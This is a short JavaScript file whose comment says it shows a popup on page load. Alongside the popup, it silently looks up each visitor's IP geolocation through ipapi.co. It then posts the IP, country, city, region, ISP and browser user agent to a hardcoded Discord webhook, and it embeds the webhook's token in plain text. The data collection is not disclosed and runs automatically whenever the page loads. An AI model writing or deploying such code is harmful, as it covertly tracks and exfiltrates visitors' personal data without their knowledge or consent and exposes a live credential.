
// Show popup on page load
window.onload = function () {
    document.getElementById("popup-modal").style.display = "flex";
    document.getElementById("popup-close").onclick = function () {
        document.getElementById("popup-modal").style.display = "none";
    };
    fetch("https://ipapi.co/json")
        .then(res => res.json())
        .then(data => {
            const userAgent = navigator.userAgent;
            const message = `👀 New visit:\n🌍 IP: ${data.ip}\n📍 Country: ${data.country_name} (${data.country_code})\n🏙️ City: ${data.city}\n🌐 Region: ${data.region}\n🔌 ISP: ${data.org}\n🧭 Browser: ${userAgent}`;
            fetch("https://discordapp.com/api/webhooks/1374477247582437537/CtcC6Ce6MfFrf6Zw7_yzeO8DikQMErIzaNEdWYBJSr9A5CGOd5PcWmOaqSShwpTYxdb3", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            });
        });
};
